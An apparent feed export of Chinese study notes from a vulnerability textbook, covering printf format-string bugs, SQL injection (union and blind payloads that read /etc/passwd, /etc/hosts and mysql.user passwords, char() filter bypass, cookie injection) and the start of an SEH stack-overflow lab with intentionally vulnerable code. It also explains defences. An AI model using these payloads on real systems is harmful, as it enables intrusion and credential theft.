缺少了待输出的数据列表，它运行后会输出什么呢？</p><table><thead><tr><th></th><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows XP SP3</td><td>其他 Win32 操作系统也可进行本实验</td></tr><tr><td>编译器</td><td>Visual C++ 6.0</td><td></td></tr><tr><td>编译选项</td><td>默认编译选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td>debug 版本的实验过程将和本实验指导有所差异</td></tr></tbody></table><blockquote><p>说明： 推荐使用 VC 加载程序，在程序关闭前能自动暂停程序以观察输出结果。</p></blockquote><p>输出结果：<br><img src="/2022/05/06/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20220425224825046.png" alt="image-20220425224825046"></p><p>第二次 printf 没有引起异常，程序正常执行，只是输出数据有些出乎意料。</p><p>用OD调试一下，发现在第一次调用 printf 时，参数按照从左到右的顺序入栈，栈中的状态如下图：<br><img src="/2022/05/06/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20220425225140482.png" alt="image-20220425225140482"></p><p>第二次调用 printf 时，由于缺少待输出参数列表，所以只压入格式控制符参数。输出时，系统把格式控制符后面的两个 DWORD 当成了待输出参数列表，自动把十六进制转换成 %d 的有符号整型。</p><h2 id="用-printf-读取内存数据"><a class="markdownIt-Anchor" href="#用-printf-读取内存数据"></a> 用 printf 读取内存数据</h2><p>如果 printf 函数参数中的 ”格式控制符“ 可以被外界输入影响，那就是格式化串漏洞了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实验环境：</p><table><thead><tr><th></th><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows XP SP3</td><td>其他 Win32 操作系统也可进行本实验</td></tr><tr><td>编译器</td><td>Visual C++ 6.0</td><td></td></tr><tr><td>编译选项</td><td>默认编译选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td>debug 版本的实验过程将和本实验指导有所差异</td></tr></tbody></table><blockquote><p>说明：请使用命令行传入方式加载，并传入适当的参数配合。</p></blockquote><p>打开 <code>cmd</code> 进入程序目录，输入：name.exe %p %p…</p><p>通过传入格式控制符，printf 就会打印出栈中的数据。</p><p>运行结果：<br><img src="/2022/05/06/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20220425230252275.png" alt="image-20220425230252275"></p><h2 id="用-printf-向内存写数据"><a class="markdownIt-Anchor" href="#用-printf-向内存写数据"></a> 用 printf 向内存写数据</h2><p>格式控制符 <code>%n</code> 能把当前输出的所有数据的长度写回到一个变量中去。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> len_print=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;before write: length=%d\n&quot;</span>,len_print);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;failwest:%d%n\n&quot;</span>,len_print,&amp;len_print);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;after write: length=%d\n&quot;</span>,len_print);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>字符串 “failwest:0” 长度为10，所以第二个 printf 中的 len_print 将会被赋值为 10。<br>实验环境：</p><table><thead><tr><th></th><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows XP SP3</td><td>其他 Win32 操作系统也可进行本实验</td></tr><tr><td>编译器</td><td>Visual C++ 6.0</td><td></td></tr><tr><td>编译选项</td><td>默认编译选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td>debug 版本的实验过程将和本实验指导有所差异</td></tr></tbody></table><blockquote><p>说明：推荐使用 VC 加载程序，再程序关闭前能自动暂停程序以观察输出结果。</p></blockquote><p>结果如下图：<br><img src="/2022/05/06/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20220506000655692.png" alt="image-20220506000655692"></p><h2 id="格式化串漏洞的检测与防范"><a class="markdownIt-Anchor" href="#格式化串漏洞的检测与防范"></a> 格式化串漏洞的检测与防范</h2><p>当输入输出函数的格式化控制符能够被外界影响时，攻击者可以综合利用前面介绍的读内存和写内存的方法修改函数返回地址，劫持进程，从而使 shellcode 得到执行。</p><p>格式化串漏洞的起因非常简单，只要检测相关的函数的参数配置是否恰当就行。通常能引起格式化串漏洞的函数包括：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">( <span class="type">const</span> <span class="type">char</span>* format [, argument]... )</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">wprintf</span><span class="params">( <span class="type">const</span> <span class="type">wchar_t</span>* format [, argument]... )</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fprintf</span><span class="params">( FILE* stream, <span class="type">const</span> <span class="type">char</span>* format [, argument ]...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fwprintf</span><span class="params">( FILE* stream, <span class="type">const</span> <span class="type">wchar_t</span>* format [, argument ]...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sprintf</span><span class="params">( <span class="type">char</span> *buffer, <span class="type">const</span> <span class="type">char</span> *format [, argument] ... )</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">swprintf</span><span class="params">( <span class="type">wchar_t</span> *buffer, <span class="type">const</span> <span class="type">wchar_t</span> *format [, argument] ... )</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">vprintf</span><span class="params">( <span class="type">const</span> <span class="type">char</span> *format, va_list argptr )</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">vwprintf</span><span class="params">( <span class="type">const</span> <span class="type">wchar_t</span> *format, va_list argptr )</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">vfprintf</span><span class="params">( FILE *stream, <span class="type">const</span> <span class="type">char</span> *format, va_list argptr )</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">vfwprintf</span><span class="params">( FILE *stream, <span class="type">const</span> <span class="type">wchar_t</span> *format, va_list argptr )</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">vsprintf</span><span class="params">( <span class="type">char</span> *buffer, <span class="type">const</span> <span class="type">char</span> *format, va_list argptr )</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">vswprintf</span><span class="params">( <span class="type">wchar_t</span> *buffer, <span class="type">const</span> <span class="type">wchar_t</span> *format, va_list argptr )</span>;</span><br></pre></td></tr></table></figure><p>通过简单的静态代码扫描，一般可以比较容易地发现这类漏洞。此外， VS2005 中在编译级别对参数做了更好的检查，而且默认情况下关闭了对 “%n” 控制符的使用。</p><h1 id="sql注入攻击脚本漏洞"><a class="markdownIt-Anchor" href="#sql注入攻击脚本漏洞"></a> SQL注入攻击（脚本漏洞）</h1><h2 id="sql-注入原理"><a class="markdownIt-Anchor" href="#sql-注入原理"></a> SQL 注入原理</h2><p>SQL 命令注入的漏洞是 Web 系统特有的一类漏洞，它源于 PHP 、ASP等脚本语言对用户输入数据和解析时的缺陷。</p><p><strong>SQL 命令注入的精髓</strong>是构造巧妙的注入命令串，从服务器不同的反馈结果中，逐步分析出数据库中各个表项之间的关系，直到攻破数据库。</p><p>以 PHP 语言为例，如果用户的输入能够影响到脚本中 SQL 命令串的生成，那么很可能在添加了单引号、 #号等转义命令字符后，能够改变数据库最终执行的 SQL 命令。<br><img src="/2022/05/06/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20220426112042428.png" alt="image-20220426112042428"></p><h2 id="攻击-php-mysql-网站"><a class="markdownIt-Anchor" href="#攻击-php-mysql-网站"></a> 攻击 PHP + MySQL 网站</h2><p>首先介绍一下 PHP 配置文件 php.ini 中与注入攻击相关的重要选项，如下表</p><table><thead><tr><th>选 项</th><th>安全配置</th><th>说 明</th></tr></thead><tbody><tr><td>safe_mode</td><td>on</td><td>安全模式</td></tr><tr><td>display_errors</td><td>off</td><td>是否向客户端返回错误信息。错误信息能够帮助攻击者摸 清数据库的表结构和变量类型等重要信息</td></tr><tr><td>magic_quotes_gpc</td><td>on</td><td>自动将提交变量中的单引号、双引号、反斜线等特殊符号 替换为转义字符的形式。例如， ’ 将被转换为 \’</td></tr></tbody></table><p>在 display_errors 关闭的情况下，攻击者可以利用<strong>盲注</strong>的方法通过服务器的不同反馈进行分析，获得表结构和列名等信息；</p><p>在 magic_quotes_gpc 打开的情况下，攻击者仍然可以通过 MySQL 提供的 <strong>char()和 ascii()等函数引用敏感字符</strong>。</p><h3 id="联合查询mysql-4x及以上的版本"><a class="markdownIt-Anchor" href="#联合查询mysql-4x及以上的版本"></a> 联合查询（MySQL 4.x及以上的版本）</h3><p>利用<strong>联合查询</strong>往往可以直接把得到的数据返回到某个变量中，从而在网页中显示出来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">failwest&#x27; union select 1#</span><br><span class="line">failwest&#x27; union select 1,2#</span><br><span class="line">failwest&#x27; union select 1,2,3#</span><br><span class="line">failwest&#x27; union select 1,2,3,4,…#</span><br></pre></td></tr></table></figure><p>按照这种方式试探脚本中共有几个变量接收数据。当返回的页面不再出错时，证明变量的数量正好，观察页面中显示出来的数字，可以确定出能够用于显示结果的变量位置。</p><p>攻击者常用的注入命令串，如下表。这些攻击串可以跟在 URL 后边，其中 ”failwest“ 代表提交的变量值。</p><table><thead><tr><th>SQL 注入攻击测试用例</th><th>说 明</th></tr></thead><tbody><tr><td>failwest <br>failwest’ and 1=1# <br>failwest’ and 1=2#</td><td>判断注入点。第一次是正常请求，如果存在注入漏洞，那 么<strong>第二次</strong>请求得到结果应该<strong>与第一次一样</strong>，并且<strong>第三次</strong>请求得到的结果应该<strong>与前两次不同</strong></td></tr><tr><td>failwest’ or 1=1#</td><td>返回所有数据，常用于有搜索功能的页面</td></tr><tr><td>failwest’ union select version()#</td><td>返回数据库版本信息</td></tr><tr><td>failwest’ union select database()#</td><td>返回当前的库名</td></tr><tr><td>failwest’ union select user()#</td><td>返回数据库的用户名信息</td></tr><tr><td>failwest’ union select session_user()#</td><td>返回数据库的用户名信息</td></tr><tr><td>failwest’ union select system_user()#</td><td>返回数据库的用户名信息</td></tr><tr><td>failwest’ union select load_file(’/etc/passwd’)#</td><td>读取系统文件</td></tr><tr><td>failwest’ select user,password from mysql.user#</td><td>返回数据库用户的密码信息，密码一般以 MD5 的方式存放</td></tr></tbody></table><h3 id="盲注入mysql-3x-版本"><a class="markdownIt-Anchor" href="#盲注入mysql-3x-版本"></a> 盲注入（MySQL 3.x 版本）</h3><p>对于 MySQL 3.x 版本，<strong>不支持联合查询语言</strong>，无法插入整句的检索语言，因此通常采用<strong>盲注入</strong>：通过服务器对请求的反馈不同，一个字节一个字节地获得数据。</p><p>盲注入需要用到以下几个 MySQL 的函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mid( string , offset , len )</span><br></pre></td></tr></table></figure><p>这个 API 用于取出字符串中的一部分。第一个参数是所要操作的<strong>字符串</strong>，第二个参数指明要截取字符串的<strong>偏移位置</strong>，第三个参数代表字符串的<strong>长度</strong>。</p><p>当攻击者想获得 etc/hosts 文件的内容时，将先从这个文件的第一个字节开始尝试注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">failwest&#x27;and ascii(mid((load_file(&#x27;/etc/hosts&#x27;),1,1))=1#</span><br><span class="line">failwest&#x27;and ascii(mid((load_file(&#x27;/etc/hosts&#x27;),1,1))=2#</span><br><span class="line">failwest&#x27;and ascii(mid((load_file(&#x27;/etc/hosts&#x27;),1,1))=3#</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>当尝试的 ASCII 码与/etc/hosts 文件第一个字符的 ASCII 一样的时候， 服务器将返回正常的页面，其余的尝试都将获得错误的页面。由于反馈的不同，最多进行 255 次尝试就能得到/etc/hosts 文件的第一个字节的值。</p><p>在获得了第一个字节之后，可以通过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">failwest&#x27;and ascii(mid((load_file(&#x27;/etc/hosts&#x27;),2,1))=1#</span><br><span class="line">failwest&#x27;and ascii(mid((load_file(&#x27;/etc/hosts&#x27;),2,1))=2#</span><br><span class="line">failwest&#x27;and ascii(mid((load_file(&#x27;/etc/hosts&#x27;),2,1))=3#</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>获得第二个字节、第三个字节……的内容。</p><p>这里应该使用折半查找法。</p><p>最后，当 php.ini 中的 magic_quotes_gpc 配置选项被打开时，我们<strong>不能在攻击串中使用单引号</strong>，因为这对字符变量的攻击将不再可行，但如果是数字型变量，则仍然能够实现注入攻击。</p><p>对应于上例， load_file(’/etc/hosts’)调用中的单引号和斜杠可以用 MySQL 提供的另一个函数 char() 进行转换，如下表。</p><table><thead><tr><th>char</th><th>/ e</th><th>t</th><th>c</th><th>/</th><th>H</th><th>o</th><th>s</th><th>t</th><th>s</th></tr></thead><tbody><tr><td>ASCII</td><td>47 101</td><td>116</td><td>99</td><td>47</td><td>104</td><td>111</td><td>115</td><td>116</td><td>115</td></tr></tbody></table><p><code>failwest'and ascii(mid((load_file('etc/host'),1,1))=1#</code><br>可以转换为<br><code>failwest’ and ascii(mid((load_file(char(47,101,116,99,47,104,111,115,116,115),1,1))=1#</code></p><h3 id="注入攻击的检测与防范"><a class="markdownIt-Anchor" href="#注入攻击的检测与防范"></a> 注入攻击的检测与防范</h3><p>针对 SQL 注入漏洞的<strong>传统防范方式</strong>：对用户输入的数据进行限制，过滤掉可能引起攻击的敏感字符。</p><blockquote><p>注意：数据库对大小写不敏感。使用正则表达式，同时过滤掉 select、SELECT、Select、sElect 等所有形式的保留字。</p></blockquote><p>SQL 注入产生的<strong>根源</strong>：查询语句采用了拼接字符串的形式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string sql = “select * from users where user=’” + username + “’ and psw=’” + password + “’”; </span><br><span class="line">//username 和 password 两个变量的值是由用户输入的</span><br></pre></td></tr></table></figure><p>**有效防范方式：**使用参数化查询的方法。</p><p>参数化查询就是在访问数据库时，将查询语句中要填入的数据通过参数的方式传递，这样数据库不会将参数的内容视为 SQL 语句的一部分，因此即便参数中含有攻击者构造的查询指令，也不会被执行。 典型的参数化查询语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string sql = &quot;select * from users where username=? and password=?&quot;;</span><br><span class="line">PreparedStatement pstmt = connection.prepareStatement(sql);</span><br><span class="line">pstmt.setString(1,username);</span><br><span class="line">pstmt.setString(2,password);//username 和 password 两个变量的值是由用户输入的</span><br></pre></td></tr></table></figure><p>防治和检测 SQL 注入漏洞的主要方法：</p><ul><li>实时的入侵检测。处理问题的位置位于脚本程序和数据库之间。很有效，但是会对 Web服务器 带来额外的负担</li><li>代码分析。如使用数据流分析（ Data FlowAnalysis）、类型验证系统（ Type S ystem）、模型检测系统（ Model C hecking）等查找程序高级逻辑错误的方法来对脚本代码进行漏洞挖掘。</li></ul><h2 id="其它注入方式"><a class="markdownIt-Anchor" href="#其它注入方式"></a> 其它注入方式</h2><h3 id="cookie-注入绕过马奇诺防线"><a class="markdownIt-Anchor" href="#cookie-注入绕过马奇诺防线"></a> Cookie 注入，绕过马奇诺防线</h3><p>程序员们把常用的过滤、编码函数组织成库，最终制作成通用的防注入过滤库。通过防注入库来过滤用户输入的敏感字。然而，防注入系统忽略了用户除了用 Get 和 Post 提交数据外，还能用 Cookie 提交数据。</p><p>在动态服务页面（ASP）中，程序员常常使用下面两种语句来获取用户提交的数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ID = Request.QueryString(“id”) //获取用户通过 GET 方式提交的 id 数据</span><br><span class="line">ID = Request.Form(“id”) //获取用户通过 POST 方式提交的 id 数据</span><br></pre></td></tr></table></figure><p>但为了同时支持 GET 和 POST 方式，常常使用下面这条语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ID = Request(“id”)</span><br></pre></td></tr></table></figure><p>这条语句会先读取 GET 中的数据，如果没有再读取 POST 中的数据，如果还没有则会去读取 Cookie 中的数据。很多防注入系统会检测 GET 和 POST 数据中是否存在敏感字符，却忽略了对 Cookie 数据的检测。这样，攻击者就可以利用 Cookie 提交精心构造的注入命令串来进行 SQL 注入。</p><p>如何检测一个站点是否存在 Cookie 注入漏洞呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.testsite.com/news.asp?id=169</span><br></pre></td></tr></table></figure><p>我们先输入以下地址来测试该站点是否存在 SQL 注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.testsite.com/news.asp?id=169 and 1=1</span><br></pre></td></tr></table></figure><p>如果浏览器跳出<code>请不要在参数中包含非法字符尝试注入</code>对话框或者其它类似提示，则说明该站点使用了敏感字过滤的防注入手段。</p><p>如果我们在浏览器中只输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.testsite.com/news.asp?id=16</span><br></pre></td></tr></table></figure><blockquote><p>------ 未完待续 -------</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;格式化漏洞&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#格式化漏洞&quot;&gt;&lt;/a&gt; 格式化漏洞&lt;/h1&gt;
&lt;h2 id=&quot;printf-中的缺陷&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#printf-中的</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="其它类型的漏洞" scheme="https://www.rgzzplus.com/tags/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>形形色色的内存攻击技术</title>
    <link href="https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/"/>
    <id>https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/</id>
    <published>2022-04-23T13:09:12.000Z</published>
    <updated>2022-04-23T13:11:23.983Z</updated>
    
    <content type="html"><![CDATA[<h1 id="狙击-windows-异常处理机制"><a class="markdownIt-Anchor" href="#狙击-windows-异常处理机制"></a> 狙击 Windows 异常处理机制</h1><h2 id="seh-概述"><a class="markdownIt-Anchor" href="#seh-概述"></a> S.E.H 概述</h2><p>S.E.H 即异常处理结构体（Structure Exception Handler)，它包含两个DWORD指针：S.E.H链表指针和异常处理函数句柄。<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418093731897.png" alt="image-20220418093731897"></p><h3 id="seh-初步了解"><a class="markdownIt-Anchor" href="#seh-初步了解"></a> S.E.H 初步了解</h3><p>S.E.H 链表：<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418095153126.png" alt="image-20220418095153126"></p><p>**设计思路：**在系统关闭程序前，给程序一个执行预先设定的回调函数的机会</p><p><strong>工作原理：</strong><br>（ 1） S.E.H 结构体<strong>存放在系统栈中</strong>。<br>（ 2）当线程初始化时，会自动向栈中安装一个 S.E.H，作为线程默认的异常处理。<br>（ 3）如果程序源代码中使用了__try{}，__except{}或者 Assert 宏等异常处理机制，编译器将最终通过向当前函数栈帧中安装一个 S.E.H 来实现异常处理。<br>（ 4）栈中一般会同时存在多个 S.E.H。<br>（ 5）栈中的多个 S.E.H 通过链表指针在栈内由栈顶向栈底串成单向链表，位于链表最顶端的 S.E.H 通过 T.E.B（线程环境块） 0 字节偏移处的指针标识。<br>（ 6）当异常发生时，操作系统会中断程序，并首先从 T.E.B 的 0 字节偏移处取出距离栈顶最近的 S.E.H，使用异常处理函数句柄所指向的代码来处理异常。<br>（ 7）当离“事故现场”最近的异常处理函数运行失败时，将顺着 S.E.H 链表依次尝试其他的异常处理函数。<br>（ 8）如果程序安装的所有异常处理函数都不能处理，系统将采用默认的异常处理函数。通常，这个函数会弹出一个错误对话框，然后强制关闭程序。</p><p><strong>利用思路：</strong><br>（ 1） <strong>S.E.H 存放在栈内</strong>，故溢出缓冲区的数据有可能淹没 S.E.H。<br>（ 2）精心制造的溢出数据可以把 S.E.H 中异常处理函数的入口地址更改为 shellcode 的起始地址。<br>（ 3）溢出后错误的栈帧或堆块数据往往会触发异常。<br>（ 4）当 Windows 开始处理溢出后的异常时，会错误地把 shellcode 当作异常处理函数而执行。</p><h2 id="在栈溢出中利用-seh"><a class="markdownIt-Anchor" href="#在栈溢出中利用-seh"></a> 在栈溢出中利用 S.E.H</h2><h3 id="实验代码即相关介绍"><a class="markdownIt-Anchor" href="#实验代码即相关介绍"></a> 实验代码即相关介绍</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>;<span class="comment">//200 bytes 0x90</span></span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">MyExceptionhandler</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;got an exception, press Enter to kill process!\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line">ExitProcess(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span> * input)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line"><span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">__asm <span class="type">int</span> <span class="number">3</span> <span class="comment">//used to break process for debug</span></span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">strcpy</span>(buf,input); <span class="comment">//overrun the stack</span></span><br><span class="line">zero=<span class="number">4</span>/zero; <span class="comment">//generate an exception</span></span><br><span class="line">&#125;</span><br><span class="line">__except(MyExceptionhandler())&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">test(shellcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码解释：</strong><br>（ 1）函数 test 中存在典型的栈溢出漏洞，<code>strcpy()</code>函数<br>（ 2） __try{}会在 test 的函数栈帧中安装一个 S.E.H 结构。<br>（ 3） __try 中的除零操作会产生一个异常。<br>（ 4）当 strcpy 操作没有产生溢出时，除零操作的异常将最终被 MyExceptionhandler 函数<br>处理。<br>（ 5）当 strcpy 操作产生溢出，并精确地将栈帧中的 S.E.H 异常处理句柄修改为 shellcode 的<br>入口地址时，操作系统将会错误地使用 shellcode 去处理除零异常，也就是说，代码植入成功。<br>（ 6）此外，异常处理机制与堆分配机制类似，会检测进程是否处于调试状态。如果直接使用调试器加载程序，异常处理会进入调试状态下的处理流程。因此，我们这里同样采用直接在代码中加入断点_asm int 3，让进程自动中断后再用调试器 attach 的方法进行调试。</p><p>**原理：**确定栈帧中 S.E.H 回调句柄的偏移，然后布置缓冲区，淹没这个句柄，将句柄修改为shellcode 的起始位置。</p><table><thead><tr><th>推荐使用的环境</th><th>备 